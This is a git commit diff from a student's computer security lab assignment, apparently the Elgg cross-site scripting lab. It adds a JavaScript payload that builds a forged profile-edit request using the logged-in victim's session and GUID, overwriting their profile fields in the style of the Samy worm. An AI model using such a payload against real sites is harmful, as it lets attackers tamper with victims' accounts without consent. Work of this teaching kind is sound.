2c0f351a03ef6e4eed1b28ec1e094d64ebf18899
AbdurRahmanFahad <1605069@ugrad.cse.buet.ac.bd>
2021-06-21 03:38:58 +0600

    task 2 script done

--- Computer Security/offline 2/scripts/1605069_Task_2.js
+++ Computer Security/offline 2/scripts/1605069_Task_2.js
@@ -7,10 +7,33 @@
 
     //Construct the content of your url.
     var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
-    var content=...; //FILL IN
+
 
     //Referer: http://www.xsslabelgg.com/profile/alice/edit
     var referer = "http://www.xsslabelgg.com/profile/" + elgg.session.user.name + "/edit";
+
+
+
+    /*
+
+    &description=%3Cp%3Ehemlo%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=2
+&briefdescription=&accesslevel%5Bbriefdescription%5D=2
+&location=&accesslevel%5Blocation%5D=2
+&interests=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Binterests%5D=1
+&skills=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bskills%5D=1
+&contactemail=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bcontactemail%5D=1
+&phone=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=1
+&website=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bwebsite%5D=1
+&twitter=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Btwitter%5D=1
+&guid=44
+	
+    */
+    var description = "&description=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=1";
+    var briefdescription = "&briefdescription=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bbriefdescription%5D=1";
+    var location = "&location=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Blocation%5D=1"
+    var habijabi = "&interests=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Binterests%5D=1&skills=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bskills%5D=1&contactemail=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bcontactemail%5D=1&phone=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=1&website=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bwebsite%5D=1&twitter=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Btwitter%5D=1";
+
+    var content=description+briefdescription+location+habijabi+"&guid="+elgg.session.user.guid; //FILL IN
 
     if(//Condition to check if the user is not Samy)
     {
